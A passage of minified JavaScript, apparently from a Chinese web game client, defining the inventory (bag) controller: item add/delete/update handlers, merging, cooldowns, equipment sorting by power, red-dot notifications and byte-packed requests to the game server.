e.bagModel=[],e.shopCbPer=0,e.shopCbTime=0,e.shopAdCbTime=0,e.settingBag=[],e.itemCount={0:{},1:{}},e.bagAdditional=0,e.limitTimeItems=[],e.promptList=[" ",gettext("背包满了"),"",gettext("不能被使用"),gettext("级别不足"),gettext("道具不足"),"","","",gettext("冷却中"),gettext("此道具在该副本中不能使用！"),gettext("已学会这个技能"),gettext("到达上限")],e.equipPowerDic=[],e.sysId=PackageID.Bag,e.regNetMsg(1,e.doBagData),e.regNetMsg(2,e.postBagVolAdd),e.regNetMsg(3,e.doDeleteItem),e.regNetMsg(4,e.doAddItem),e.regNetMsg(5,e.doUpDataItem),e.regNetMsg(6,e.postUseItemSuccess),e.regNetMsg(7,e.postMergeItemBack),e.regNetMsg(8,e.doChoosableGiftResult),e.regNetMsg(9,e.postBagAdditional),e.regNetMsg(10,e.postItemEndTime),e.regNetMsg(19,e.postCb),e.regNetMsg(23,e.onIncidentalAttr),e.regNetMsg(24,e.onBagCellAdd),e.regNetMsg(25,e.postSetBag),e.regNetMsg(26,e.cbMerge),e.regNetMsg(27,e.onLimitTimeItem),e.regNetMsg(28,e.onjulingItem),e.regNetMsg(29,e.openEquipTip),observe(e,e.doBagVolChange,s.Recharge.ins().postGetMonthDay),observe(e,e.postItemCoolDown,Ts.itemCd),e._useItemFunc={},e.registerUseItemFunc(a.ItemConst.RENAME,e.useRenameItem),e.initRed(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRed=function(){var t=this;this.callbackRed=new D.RedPoint(this.cbRed,this.postItemChange,this.postItemAdd,this.postItemDel),this.bagTjRed=new D.RedPoint(this.redTjRed,this.postItemAdd,this.postItemChange,this.postItemDel),this.bagAnimalsRed=new D.RedPoint(this.redAnimalsRed,this.postItemAdd,this.postItemChange,this.postItemDel),this.XinShouLiBao=new D.RedPoint(function(){for(var i=t.bagModel[e.BAG_TYPE_OTHTER],n=0,o=i;n<o.length;n++){var s=o[n];if(!isNaN(s.itemConfig.level)&&h.ActorCC.level>=s.itemConfig.level&&144==s.itemConfig.descIndex)return!0}return!1},this.postItemChange,this.postItemAdd,this.postItemDel),this.AllBagRed=new D.RedPoint(function(){var e,i,n,o,s,a,r;return(null===(e=t.XinShouLiBao)||void 0===e?void 0:e.v)||t.redWearBag()||(null===(i=B.ShenFuCT.ins().upRed)||void 0===i?void 0:i.v)||(null===(n=t.callbackRed)||void 0===n?void 0:n.v)||(null===(o=C.EquipCT.ins().tjRp)||void 0===o?void 0:o.v)||(null===(s=t.bagTjRed)||void 0===s?void 0:s.v)||(null===(a=t.bagAnimalsRed)||void 0===a?void 0:a.v)||(null===(r=E.TotemCT.ins().totemAllRed)||void 0===r?void 0:r.v)},this.postItemChange,this.postBagVolAdd,this.postItemAdd,this.postItemDel,C.EquipCT.ins().sendEquipLock,this.postItemCoolDown)},e.prototype.onIncidentalAttr=function(t){var e=t.readByte(),i=t.readDouble(),n=(t.readInt(),new o.ItemData);n.parser(t);var s=this.getBagGoodsByHandle(e,i),a=this.bagModel[e].indexOf(s);this.bagModel[e][a]=null,this.bagModel[e][a]=n;t.readByte();this.postInclidentAttr()},e.prototype.postInclidentAttr=function(){},e.prototype.sendAddBagGrid=function(t){var e=this.getBytes(2);e.writeInt(t),this.sendToServer(e)},e.prototype.sendUseItem=function(t,e,i){void 0===i&&(i=!1);var n=this.getBytes(6);n.writeInt(t),n.writeInt(e);var o=i?1:0;return n.writeInt(o),this.sendToServer(n),null!=this._useItemFunc[t]?(this._useItemFunc[t](t,e),!0):!1},e.prototype.addItemCount=function(t,e){var i=e.configID;return 0==e.count?void this.delItemCount(t,i):(this.itemCount[t][i]=this.itemCount[t][i]||0,void(1==t?this.itemCount[t][i]+=1:this.itemCount[t][i]=e.count))},e.prototype.delItemCount=function(t,e){1==t?this.itemCount[t][e]&&(this.itemCount[t][e]-=1,0==this.itemCount[t][e]&&delete this.itemCount[t][e]):delete this.itemCount[t][e]},e.prototype.getBagItemCount=function(t,e){return this.itemCount[t][e]||0},e.prototype.doBagData=function(t){var e=t.readByte(),i=t.readByte();0==e&&(this.bagModel[i]=[],this.itemCount[i]={});for(var n,s=t.readInt(),a=[],r=0;s>r;r++)n=new o.ItemData,n.parser(t),this.bagModel[i].push(n),(0==i||1==i)&&this.addItemCount(i,n),1==i&&a.push(n.handle);this.postItemAdd(),1==i&&this.doBagVolChange()},e.prototype.doBagVolChange=function(){this.postBagVolChange()},e.prototype.postBagVolChange=function(){this.postItemCountChange()},e.prototype.postUseItemSuccess=function(t){var e=t.readByte();if(e>0)return 9!=e&&u.TipsCT.ins().showTips(this.promptList[e]),null;
if(0==e){var i=t.readInts(2),n=r.GlobalConfig.ItemConfig[i[1]];return n&&n.showYb&&p.ShowImgCT.ins().showMoveImg("szyuanbao",{x:137,y:83},n.showYb,300),n&&n.showExp&&p.ShowImgCT.ins().showMoveImg("vipexphuizhang",{x:77,y:117},n.showExp,600),i}},e.prototype.postItemCoolDown=function(t){var i=t.item;for(var n in i){var o=e.ins().getBagItemById(i[n][0]);o&&(o.countdown=_.DateUtils.formatMiniDateTime(i[n][1]))}},e.prototype.isCoolDown=function(t){var i=e.ins().getBagItemById(t);return i&&i.countdown?Math.floor((i.countdown-S.GameServerCC.serverTime)/1e3):0},e.prototype.postBagVolAdd=function(t){h.ActorCC.bagNum=t.readInt()},e.prototype.doDeleteItem=function(t){var e=t.readByte(),i=t.readDouble(),n=0;if(this.bagModel[e]){for(var o=this.bagModel[e].length-1;o>=0;o--)if(this.bagModel[e][o].handle==i){this.bagModel[e][o].itemConfig.id==a.ItemConst.BACK_ITEM&&u.TipsCT.ins().showTips(gettext("|C:0xff0000&T:消耗传送卷x1")),n=this.bagModel[e][o].configID,this.bagModel[e].splice(o,1);break}1==e?this.delItemCount(e,n):0==e&&this.delItemCount(e,n),this.isDeleteDelay||(this.isDeleteDelay=!0,Timer.start(50,1,this.deleteDelay,this))}},e.prototype.doAddItem=function(t){var e=t.readByte(),i=new o.ItemData;if(i.endTime=t.readInt(),i.parser(t),this.bagModel[e]){if(this.bagModel[e].push(i),C.EquipCT.ins().sendEquipClearInfo([i.handle],[0]),i&&d.ItemUtil.isEquip(i.itemConfig)&&P.OpenSystem.ins().checkSysOpen(R.SystemType.AutoEquip)&&i.isMyEquip()){var n=v.SubRoles.ins().getSubRoleByIndex(0);!n.isWearEquip(i.handle)&&C.EquipCT.ins().checkEquipIsCanWear(i.itemConfig.id,i)&&d.ItemUtil.itemCanUp(i)&&u.TipsCT.ins().showAutoEquipWins(i)}0==e?this.addItemCount(e,i):1==e&&this.addItemCount(e,i);var s=t.readByte();if(s){var a=null===i||void 0===i?void 0:i.quality;if(a>=4&&1==e)u.TipsCT.ins().showGoodEquipTips(i);else if(2!=e)if(d.ItemUtil.getType(i.itemConfig)==c.ItemType.TYPE_18)u.TipsCT.ins().showHeartItemTips(i.itemConfig.id);else{if(i.getGemLv())var l=i.getGemLv(),h=gettext("获得|C:")+d.ItemUtil.getQualityColor(l)+"&T:"+r.GlobalConfig.GemUpdateConfig[l].lvName+i.getGemName()+" x "+i.count+"|";else h=gettext("获得|C:")+d.ItemUtil.getQualityColor(a)+"&T:"+i.itemConfig.name+" x "+i.count+"|";u.TipsCT.ins().showTips(h)}}this.isAddDelay||(this.isAddDelay=!0,Timer.start(50,1,this.addDelay,this)),C.EquipCT.ins().postBagItemAdd(i.handle)}},e.prototype.addDelay=function(){this.isAddDelay=!1,this.postItemAdd(),this.doBagVolChange()},e.prototype.deleteDelay=function(){this.isDeleteDelay=!1,this.postItemDel(),this.doBagVolChange()},e.prototype.doUpDataItem=function(t){var i,n=t.readByte(),o=t.readDouble(),s=0;if(this.bagModel[n]){for(var r=0;r<this.bagModel[n].length;r++)if(i=this.bagModel[n][r],i.handle==o){var l=t.readInt();if(i.itemConfig.id==a.ItemConst.BACK_ITEM){var h=e.ins().getBagItemById(a.ItemConst.BACK_ITEM).count;h>l&&u.TipsCT.ins().showTips(gettext("|C:0xff0000&T:消耗传送卷x1"))}s=l-i.count,i.count=l,0==n?this.addItemCount(n,i):1==n&&this.addItemCount(n,i),d.ItemUtil.getType(i.itemConfig)==c.ItemType.TYPE_47&&this.sendItemEndTime(o);break}var p=t.readByte();if(p&&s>0&&2!=n){if(d.ItemUtil.getType(i.itemConfig)==c.ItemType.TYPE_18)u.TipsCT.ins().showHeartItemTips(i.itemConfig.id);else{var f=d.ItemUtil.getQualityColor(null===i||void 0===i?void 0:i.quality),g=gettext("获得|C:")+f+"&T:"+i.itemConfig.name+" x "+s+"|";u.TipsCT.ins().showTips(g)}this.postItemAdd()}this.doBagVolChange(),this.postItemChange()}},e.prototype.sendMergeItem=function(t,e){var i=this.getBytes(7);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.postMergeItemBack=function(t){for(var e=(t.readInt(),t.readInt(),t.readInt()),i=[],n=0;e>n;n++)i[n]=new f.RewardData,i[n].parser(t);return i},e.prototype.sendGetGoodsByStore=function(t){if(t==l.DepotType.Equip&&this.getAllSurplusCount(1)<=1){var e=r.GlobalConfig.ServerTips[2].tips;return void u.TipsCT.ins().showTips(e)}var i=this.getBytes(4);i.writeDouble(t),this.sendToServer(i)},e.prototype.postItemChange=function(){},e.prototype.registerUseItemFunc=function(t,e){this._useItemFunc[t]=e},e.prototype.postItemDel=function(){},e.prototype.postItemAdd=function(){},e.prototype.postItemCountChange=function(){},e.prototype.getBagItemById=function(t,i){void 0===i&&(i=e.BAG_TYPE_OTHTER);var n=this.bagModel[i];if(!n)return null;for(var o=0,s=n;o<s.length;o++){var a=s[o];if(a.itemConfig.id==t)return a}return null},e.prototype.getBagItemsByType=function(t){void 0===t&&(t=e.BAG_TYPE_OTHTER);var i=this.bagModel[t]||[];return i},e.prototype.getBagGoodsByTypeAndId=function(t,e){for(var i=this.bagModel[t],n=0,o=i;n<o.length;n++){var s=o[n];if(s.itemConfig.id==e)return s}return null},e.prototype.getBagEquipByType=function(t){var i=this.bagModel[e.BAG_TYPE_EQUIP],n=[];if(!i)return n;for(var o=0,s=i;o<s.length;o++){var a=s[o];d.ItemUtil.getType(a.itemConfig)==t&&n.push(a)}return n},e.prototype.cbRed=function(){var t=r.GlobalConfig.RongLuqQdhsConfig;for(var i in t)if(2==t[i].group&&t[i].itemid&&e.ins().getBagGoodsCountById(e.BAG_TYPE_OTHTER,t[i].itemid[0]))return!0;return!1},e.prototype.redWearBag=function(){return !1;var t,i;if(!this.bagModel)return!1;var n=this.bagModel[e.BAG_TYPE_EQUIP];if(!n)return!1;for(var o=0;o<n.length;o++){var s=n[o],a=e.ins().getEquipAttrs(s),l=s.point?s.point:d.ItemUtil.getAttrPower(a),h=s.itemConfig,u=r.GlobalConfig.EquipConfig;l+=(null===(t=u[h.id])||void 0===t?void 0:t.exPower)||0;var p=v.SubRoles.ins().getSubRoleByIndex(0);if(!p.isWearEquip(s.handle)&&C.EquipCT.ins().checkEquipIsCanWear(h.id,s)){var c=d.ItemUtil.getSubType(h),f=x.CommonUtils.copyDataHandler(d.ItemUtil.getPosList(h)||[]);-1==f.indexOf(c)&&f.push(c);for(var g=0;g<f.length;g++){var m=f[g],y=p.getEquipByIndex(m);if(!(y&&y.item&&y.item.itemConfig))return!0;a=e.ins().getEquipAttrs(y.item);var T=y.item.point?y.item.point:d.ItemUtil.getAttrPower(a);if(T+=(null===(i=u[y.item.itemConfig.id])||void 0===i?void 0:i.exPower)||0,l>T)return!0}}}return!1},e.prototype.redTjRed=function(){return !1;for(var t=e.ins().bagModel[e.BAG_TYPE_EQUIP]||[],i=0;i<t.length;i++)if(C.EquipCT.ins().checkUpTjItem(t[i].configID))return!0;t=e.ins().bagModel[e.BAG_TYPE_OTHTER]||[];for(var i=0;i<t.length;i++)if(C.EquipCT.ins().checkUpTjItem(t[i].configID))return!0;return!1},e.prototype.redAnimalsRed=function(){for(var t=e.ins().bagModel[e.BAG_TYPE_EQUIP]||[],i=0;i<t.length;i++)if(C.EquipCT.ins().checkUpAnimalsItem(t[i].configID))return!0;t=e.ins().bagModel[e.BAG_TYPE_OTHTER]||[];for(var i=0;i<t.length;i++)if(C.EquipCT.ins().checkUpAnimalsItem(t[i].configID))return!0;return!1},e.prototype.getBagGoodsByTypeAndSubType=function(t,e){for(var i=this.getBagGoodsByType(t),n=[],o=0,s=i;o<s.length;o++){var a=s[o];d.ItemUtil.getSubType(a.itemConfig)==e&&n.push(a)}return n},e.prototype.isConsumeEnough=function(t,i,n,o){void 0===i&&(i=e.BAG_TYPE_OTHTER),void 0===n&&(n=!1),void 0===o&&(o=!1);for(var s=t instanceof Array?t:[t],a=!0,l=0;l<s.length;l++){var p=s[l],d=0;if(d=0==p.type&&1==p.id?h.ActorCC.gold:0==p.type&&2==p.id?h.ActorCC.yb:this.getBagItemCount(i,p.id),a=a&&d>=p.count,!a){if(n){var c=r.GlobalConfig.ItemConfig[p.id];0==p.type&&1==p.id?(u.TipsCT.ins().showTips(gettext("金币不足！")),M.GameFlashSaleCt.ins().reportGolaNot()):0==p.type&&2==p.id?u.TipsCT.ins().showTips(gettext("元宝不足！")):o?G.WarnCT.ins().setBuyGoodsWarn(p.id):u.TipsCT.ins().showTips(gettext("{0}不足！",c.name))}return!1}}return a},e.prototype.getBagGoodsCountById=function(t,e){if(0==t||1==t)return this.getBagItemCount(t,e);var i=this.bagModel[t];if(i)for(var n=0,o=i;n<o.length;n++){var s=o[n];if(s.itemConfig&&s.itemConfig.id==e)return s.count}return 0},e.prototype.getBagGoodsByIndex=function(t,e){return this.bagModel[t][e]},e.prototype.getBagItemNum=function(t){void 0===t&&(t=1);var e=this.bagModel[t];return e?e.length:0},e.prototype.getSurplusCount=function(){return h.ActorCC.bagNum-this.getBagItemNum()+this.bagAdditional},e.prototype.rockonNeedNum=function(t){var e=0;for(var i in t)t[i].id&&r.GlobalConfig.ItemConfig[t[i].id]&&e++;return e},e.prototype.getAllSurplusCount=function(t){void 0===t&&(t=8);var i=e.ins().getBagItemNum(1)+e.ins().getBagItemNum(0),n=h.ActorCC.bagNum-i+this.bagAdditional;return n=t>n?-1:n},e.prototype.getMaxBagRoom=function(){return h.ActorCC.bagNum+this.bagAdditional},e.prototype.sort2=function(t,e){return m.Algorithm.sortAsc(t.point,e.point)},e.prototype.sort3=function(t,e){var i=m.Algorithm.sortDesc(t.point,e.point);return 0==i&&(i=m.Algorithm.sortDesc(t.configID,e.configID)),i},e.prototype.getBagSortQualityEquips=function(t,i,n,o){void 0===t&&(t=5),void 0===i&&(i=0),void 0===n&&(n=0),void 0===o&&(o=null);var s=this.bagModel[e.BAG_TYPE_EQUIP],a=[];if(!s)return a;for(var r=0,l=s;r<l.length;r++){var h=l[r];h.canbeUsed=C.EquipCT.ins().checkUpTjItem(h.configID)||C.EquipCT.ins().checkUpAnimalsItem(h.configID);var u=null===h||void 0===h?void 0:h.quality;5!=t&&(u>t||i&&t>u)||(null==o||o(h))&&(a[a.length]=h)}return a},e.prototype.getBagGoodsBySort=function(t,i){void 0===i&&(i=e.BAG_TYPE_OTHTER);var n=this.getGoodsListByType(t,i);return n.sort(function(t,e){return m.Algorithm.sortAsc(t.configID,e.configID)}),n},e.prototype.getBagGoodsByType=function(t){var i=this.bagModel[e.BAG_TYPE_OTHTER],n=[];if(!i)return n;for(var o=0,s=i;o<s.length;o++){var a=s[o];d.ItemUtil.getType(a.itemConfig)==t&&n.push(a)}return n},e.prototype.getBagEquipsByQuality=function(t,i,n){void 0===i&&(i=0),void 0===n&&(n=e.BAG_TYPE_EQUIP);var o=this.bagModel[n],s=[];if(!o)return s;for(var a=0,r=o;a<r.length;a++){var l=r[a];l&&d.ItemUtil.getType(l.itemConfig)==i&&l.quality==t&&s.push(l)}return s},e.prototype.getBagGoodsByHandle=function(t,e){var i=this.bagModel[t];if(!i)return null;for(var n=0,o=i;n<o.length;n++){var s=o[n];if(s.handle==e)return s}return null},e.prototype.getGoodsListByType=function(t,e){var i=this.bagModel[e],n=[];if(i)for(var o=0,s=i;o<s.length;o++){var a=s[o];a.canbeUsed=C.EquipCT.ins().checkUpTjItem(a.configID)||C.EquipCT.ins().checkUpAnimalsItem(a.configID);var r=a.itemConfig;(r.bagType==t||0==t&&!r.bagType)&&(r.split?this.splitItemData(n,a):n.push(a))}return n},e.prototype.splitItemData=function(t,e){var i=e.count;if(i>1)for(;i>0;){var n=e.copy();n.count=1,t.push(n),i-=1}else t.push(e)},e.prototype.getGuanyinLevel=function(t){var e=w.TextFlowMaker.getCStr(t.id-a.ItemConst.GUANYIN_ITEM+1);return gettext("{0}阶",e)},e.prototype.getEquipsScoreByRolesOfBody=function(){for(var t=v.SubRoles.ins().subRolesLen,e=0,i=0;t>i;i++){var n=v.SubRoles.ins().getSubRoleByIndex(i);if(n&&n.equipsData)for(var o=n.equipsData,s=0;s<b.EquipPos.MAX;s++)o[s]&&o[s].item&&o[s].item.itemConfig&&o[s].item.itemConfig.id&&(e+=o[s].item.point)}return e},e.prototype.calculationScore=function(t){for(var e,i=0,n=v.SubRoles.ins().subRolesLen,o=0;n>o;o++){var s=v.SubRoles.ins().getSubRoleByIndex(o);if(s.job==d.ItemUtil.getJob(t.itemConfig))for(var a=s.getEquipLen(),r=0;a>r;r++)e=s.getEquipByIndex(r).item,e&&e.itemConfig&&d.ItemUtil.getSubType(e.itemConfig)==d.ItemUtil.getSubType(t.itemConfig)&&(i=0==i?e.point:Math.min(e.point,i))}return t.point-i},e.prototype.useRenameItem=function(t,e){win.open("RenameWin")},e.prototype.setEquipPowerDic=function(t,e,i){void 0===i&&(i=0),this.equipPowerDic[t]||(this.equipPowerDic[t]=[]),this.equipPowerDic[t][e]||(this.equipPowerDic[t][e]=0),this.equipPowerDic[t][e]=i},e.prototype.getEquipPowerDic=function(t,e){return this.equipPowerDic[t]&&this.equipPowerDic[t][e]?this.equipPowerDic[t][e]:0},e.prototype.getLowEquipIndex=function(t,e){for(var i=-1,n=Number.MAX_VALUE,o=t.length,s=0;o>s;s++)if(T.ForgeConst.EQUIP_POS_TO_SUB[s]==e){var a=t[s];if(0==a.handle)return s;var r=a.point;n>r&&(i=s,n=r)}return i},e.prototype.getThundersByPos=function(t){void 0===t&&(t=null);for(var i=this.bagModel[e.BAG_TYPE_EQUIP],n=[],o=[],s=g.ZsCT.ins().stage,a=h.ActorCC.level,r=0,l=i;r<l.length;r++){var u=l[r];d.ItemUtil.getType(u.itemConfig)!=c.ItemType.TYPE_26||(null==t?0:d.ItemUtil.getSubType(u.itemConfig)!=t)||(s<u.itemConfig.zsLevel||a<u.itemConfig.level?o.push(u):n.push(u))}return n=n.sort(this.sortFun),o.sort(this.sortFun),n=n.concat(o)},e.prototype.getEquipByPos=function(t,i){var n=this.bagModel[e.BAG_TYPE_EQUIP];if(!n)return[];var o=v.SubRoles.ins().getSubRoleByIndex(t),s=o.getEquipByIndex(i),a=0;a=s&&s.item.itemConfig?d.ItemUtil.getSubType(s.item.itemConfig):i;for(var r=[],l=[],u=h.ActorCC.level,p=g.ZsCT.ins().stage,c=0,f=n;c<f.length;c++){var m=f[c],y=d.ItemUtil.getJob(m.itemConfig),C=d.ItemUtil.getSubType(m.itemConfig),T=d.ItemUtil.getPosList(m.itemConfig);if((y==o.job||0==y)&&(C==a||T&&T.indexOf(a)>-1)){if(91==Math.floor(m.itemConfig.id/1e4))continue;if(s&&m.handle==s.item.handle)continue;if(0!=d.ItemUtil.getType(m.itemConfig))continue;p<m.itemConfig.zsLevel||u<m.itemConfig.level?l.push(m):r.push(m)}}return r=r.sort(this.sortFun),l.sort(this.sortFun),r=r.concat(l)},e.prototype.sortFun=function(t,i){var n=e.ins().getEquipAttrs(t),o=d.ItemUtil.getAttrPower(n),s=e.ins().getEquipAttrs(i),a=d.ItemUtil.getAttrPower(s);return a>o?1:o>a?-1:0},e.prototype.getEquipAttrs=function(t){var e=r.GlobalConfig.EquipConfig[t.configID],i=[];for(var n in y.Role.translate)if(e&&!(e[n]<0)){var o=t.att,s=new I.AttributeData;if(void 0!=e[n]&&(s.type=y.Role.getAttrTypeByName(n),s.value=e[n]),o)for(var a=0;a<o.length;a++)if(o[a].type==y.Role.getAttrTypeByName(n)){s.value+=o[a].value;break}s&&i.push(s)}return i},e.prototype.doChoosableGiftResult=function(t){var e=t.readUnsignedByte();0==e&&this.postGiftResult()},e.prototype.postGiftResult=function(){},e.prototype.postBagAdditional=function(t){this.bagAdditional=t.readInt()},e.prototype.sendChoosableGift=function(t,e,i){var n=this.getBytes(8);n.writeInt(t),n.writeInt(e),n.writeInt(i+1),this.sendToServer(n)},e.prototype.postItemEndTime=function(t){var i=t.readDouble(),n=this.getBagGoodsByHandle(e.BAG_TYPE_OTHTER,i);n&&(n.endTime=_.DateUtils.formatMiniDateTime(t.readInt()))},e.prototype.updatePostItemEndTime=function(t){return _.DateUtils.formatMiniDateTime(t)},e.prototype.sendItemEndTime=function(t){var e=this.getBytes(10);e.writeDouble(t),this.sendToServer(e)},e.prototype.getRmbItemIsBuy=function(t){var e=r.GlobalConfig.ItemConfig[t];return e&&e.needyuanbao&&h.ActorCC.yb>=e.needyuanbao?!0:!1},e.prototype.postCb=function(t){this.shopCbPer=t.readUnsignedByte(),this.shopCbTime=t.readShort(),this.shopAdCbTime=t.readByte(),this.updateCb()},e.prototype.updateCb=function(){},e.prototype.sendCb=function(){var t=this.getBytes(19);this.sendToServer(t)},e.prototype.sendCbequip=function(t,e,i){void 0===e&&(e=[]);var n=this.getBytes(20);if(n.writeByte(t),n.writeShort(e.length),1==t||4==t)for(var o in e)n.writeDouble(e[o].handle),n.writeInt(1);else for(var o in e)n.writeDouble(e[o].configID),n.writeInt(i||e[o].count);urlParam.isResAliPay&&platform.reclaimEquip(),this.sendToServer(n)},e.prototype.sendUseCb=function(){var t=this.getBytes(22);this.sendToServer(t)},e.prototype.onBagCellAdd=function(t){this.goldLastTime=t.readByte(),this.payLastTime=t.readByte(),this.adLastTime=t.readByte(),this.todayAdLastTime=t.readByte(),this.YuanBaoTimes=t.readByte(),this.postBagCellAdd()},e.prototype.sendBagCellAdd=function(t){var e=this.getBytes(24);e.writeByte(t),this.sendToServer(e)},e.prototype.postBagCellAdd=function(){},e.prototype.getBagEquipsByQuality2=function(t,i){void 0===i&&(i=!0);var n=this.bagModel[e.BAG_TYPE_EQUIP],o=[];if(!n)return o;for(var s=0,a=n;s<a.length;s++){var r=a[s],l=!1;if(!C.EquipCT.ins().isNoShow(r.itemConfig)){for(var h=0;h<r.att.length;h++)r.att[h].value>0&&(l=!0);(!l||i)&&r&&r.quality==t&&!r.lock&&o.push(r)}}return o},e.prototype.getBagCallEquipsByItemId=function(t,i){var n;void 0===i&&(i=!0);var o=this.bagModel[e.BAG_TYPE_EQUIP],s=[];if(!o)return s;for(var a=0,r=o;a<r.length;a++){for(var l=r[a],h=!1,u=0;u<l.att.length;u++)l.att[u].value>0&&(h=!0);(!h||i)&&l&&(null===(n=l.itemConfig)||void 0===n?void 0:n.id)==t&&!l.lock&&s.push(l)}return s},e.prototype.getBagEquipsByQuality3=function(t,i){void 0===i&&(i=e.BAG_TYPE_EQUIP);var n=this.bagModel[i],o=[];if(!n)return o;for(var s=0,a=n;s<a.length;s++){var r=a[s];r&&r.quality==t&&o.push(r)}return o},e.prototype.getBagEquipsByMinQuality=function(t,i){void 0===i&&(i=e.BAG_TYPE_EQUIP);var n=this.bagModel[i],o=[];if(!n)return o;for(var s=0,a=n;s<a.length;s++){var r=a[s];r&&r.quality>t&&o.push(r)}return o},e.prototype.getBagItemSById=function(t,i){void 0===i&&(i=e.BAG_TYPE_OTHTER);var n=[],o=this.bagModel[i];if(!o)return n;for(var s=0,a=o;s<a.length;s++){var r=a[s];r.itemConfig.id==t&&n.push(r)}return n},e.prototype.setSelectEquipIdx=function(t){return t},e.prototype.sendSetBag=function(){var t=this.settingBag.length||0,e=this.getBytes(25);e.writeByte(t);for(var i=0;t>i;i++)e.writeByte(this.settingBag[i].type),e.writeShort(this.settingBag[i].value);this.sendToServer(e)},e.prototype.postSetBag=function(t){var e=t.readByte();this.settingBag=[];for(var i=0;e>i;i++){var n=t.readByte(),o=t.readShort();this.settingBag.push({type:n,value:o})}},e.prototype.sendMerge=function(t,e){void 0===e&&(e=1);var i=this.getBytes(26);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.sendMergeMost=function(t,e){var i=this.getBytes(33),n=t.length;i.writeUnsignedShort(n);for(var o=0;n>o;o++)i.writeInt(t[o].id+e),i.writeInt(t[o].count);this.sendToServer(i)},e.prototype.cbMerge=function(t){var e=t.readByte();e&&this.postgCbMerge()},e.prototype.postgCbMerge=function(){},e.prototype.onLimitTimeItem=function(t){var e=t.readShort(),i=Timer.has(this.LimitTimer,this);i&&Timer.stop(this.LimitTimer,this),this.limitTimeItems=[];for(var n=0;e>n;n++){var o=new A.LimitTimeItemData;o.parser(t),this.limitTimeItems.push(o)}this.postLimitTimeItem(),0!=e&&Timer.start(1e3,-1,this.LimitTimer,this)},e.prototype.LimitTimer=function(){for(var t=!1,e=0;e<this.limitTimeItems.length;e++){var i=this.limitTimeItems[e];i.LastTime>0&&(t=!0,i.timeFun())}t||Timer.stop(this.LimitTimer,this),this.postLimitTimeItem()},e.prototype.getLimitItemById=function(t){for(var e=0;e<this.limitTimeItems.length;e++){var i=this.limitTimeItems[e];if(i.Id==t)return i}return null},e.prototype.postLimitTimeItem=function(){},e.prototype.sendJuling=function(t){var e=this.getBytes(28);e.writeInt(t),console.log("===聚灵丹Id=>",t),this.sendToServer(e)},e.prototype.onjulingItem=function(t){var e=t.readInt();return console.log("===聚灵丹=>",e),e},e.prototype.sendLookEquipTip=function(t,e){void 0===e&&(e=0);var i=this.getBytes(29);i.writeInt(e),i.writeDouble(t),this.sendToServer(i)},e.prototype.openEquipTip=function(t){var i,n,s=t.readByte();if(!s)return void u.TipsCT.ins().showTips(gettext("无法查询到装备"));var a=new o.ItemData;a.parser(t);for(var r=v.SubRoles.ins().getSubRoleByIndex(0),l=r.equipsData,h=null,p=-1,d=null,c=0;c<l.length;c++)if((null===(i=l[c].item)||void 0===i?void 0:i.handle)&&(null===(n=l[c].item)||void 0===n?void 0:n.handle)==(a?a.handle:null)){h=r,p=r.index,d=c;break}h?a=l[c].item:e.ins().getBagGoodsByHandle(e.BAG_TYPE_EQUIP,a.handle)&&(a=e.ins().getBagGoodsByHandle(e.BAG_TYPE_EQUIP,a.handle)),win.open("EquipDetailedWin",1,a?a.handle:null,a.configID,a,h,p,d)},e.prototype.getShowList=function(t){for(var e=[],i=0;i<t.length;i++){var n=t[i],o=C.EquipCT.ins().getEquipCanGetXlAttrCnt((null===n||void 0===n?void 0:n.quality)||0);n.isXiLian()&&n.isLessQuality(k.QualityType.Orange,3)&&o>=3&&e.push(n)}return e},e.prototype.isNotRecycleXiLianEquip=function(){var t=e.ins().settingBag[k.SettingBagType.NotRecycleXiLianEquip];return null===t||void 0===t?void 0:t.value},e.prototype.getGemItemDatasById=function(t){var i=this.bagModel[e.BAG_TYPE_OTHTER];if(i){for(var n=[],o=0,s=i;o<s.length;o++){var a=s[o],r=a.itemConfig,l=d.ItemUtil.getType(r),h=d.ItemUtil.getSubType(r),u=d.ItemUtil.getPosList(r)||[];l==c.ItemType.TYPE_55&&(h==t||u.indexOf(t)>0)&&n.push(a)}return n}},e.prototype.getItemByItemDescConfig=function(t,e,i){void 0===e&&(e=-1),void 0===i&&(i=-1);for(var n=[],o=this.bagModel[t],s=0,a=o;s<a.length;s++){var l=a[s],h=r.GlobalConfig.ItemDescConfig[l.itemConfig.descIndex];-1!=e&&h.type!=e||-1!=i&&i!=h.subType||n.push(l)}return n},e.prototype.getMasterEquipByPos=function(t,i){var n=this.bagModel[e.BAG_TYPE_EQUIP];if(!n)return[];var o=v.SubRoles.ins().getSubRoleByIndex(t),s=o.getMasterEquipByIndex(i),a=0;a=s&&s.itemConfig?d.ItemUtil.getSubType(s.itemConfig):i;for(var r=[],l=[],u=h.ActorCC.level,p=g.ZsCT.ins().stage,c=0,f=n;c<f.length;c++){var m=f[c],y=d.ItemUtil.getJob(m.itemConfig),C=d.ItemUtil.getSubType(m.itemConfig),T=d.ItemUtil.getPosList(m.itemConfig);if((y==o.job||0==y)&&(C==a||T&&T.indexOf(a)>-1)){if(s&&s.handle==m.handle)continue;if(!d.ItemUtil.isMasterEquip(m.itemConfig))continue;p<m.itemConfig.zsLevel||u<m.itemConfig.level?l.push(m):r.push(m)}}return r=r.sort(this.sortFunByPoint),l.sort(this.sortFunByPoint),r=r.concat(l)},e.prototype.sortFunByPoint=function(t,e){return e.point-t.point},e.BAG_TYPE_OTHTER=0,e.BAG_TYPE_EQUIP=1,e.BAG_TYPE_STORE=2,e.BAG_ENOUGH=20,__decorate([post()],e.prototype,"postInclidentAttr",null),__decorate([post()],e.prototype,"postBagVolChange",null),__decorate([post()],e.prototype,"postUseItemSuccess",null),__decorate([post()],e.prototype,"postItemCoolDown",null),__decorate([post()],e.prototype,"postBagVolAdd",null),__decorate([post()],e.prototype,"doAddItem",null),__decorate([post()],e.prototype,"postMergeItemBack",null),__decorate([post()],e.prototype,"postItemChange",null),__decorate([post()],e.prototype,"postItemDel",null),__decorate([post()],e.prototype,"postItemAdd",null),__decorate([post()],e.prototype,"postItemCountChange",null),__decorate([post()],e.prototype,"postGiftResult",null),__decorate([post()],e.prototype,"postBagAdditional",null),__decorate([post()],e.prototype,"updateCb",null),__decorate([post()],e.prototype,"postBagCellAdd",null),__decorate([post()],e.prototype,"setSelectEquipIdx",null),__decorate([post()],e.prototype,"postgCbMerge",null),__decorate([post()],e.prototype,"postLimitTimeItem",null),__decorate([post()],e.prototype,"onjulingItem",null)